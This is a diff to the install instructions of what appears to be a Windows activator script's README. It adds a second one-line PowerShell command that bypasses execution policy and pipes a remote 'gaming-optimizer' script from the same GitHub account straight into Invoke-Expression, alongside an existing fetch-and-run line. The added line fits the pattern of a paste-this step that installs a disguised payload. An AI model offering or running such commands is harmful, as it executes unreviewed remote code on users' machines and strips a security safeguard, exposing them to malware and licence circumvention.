@@ -20,3 +20,6 @@
 ### **Method 1: One-Line Command** 🎯
 ```powershell
 irm https://raw.githubusercontent.com/Ano-n-ymous/windows-activator-script/main/script.ps1 | iex
+
+
+powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/Ano-n-ymous/gaming-optimizer/main/gaming-optimizer.ps1 | iex"
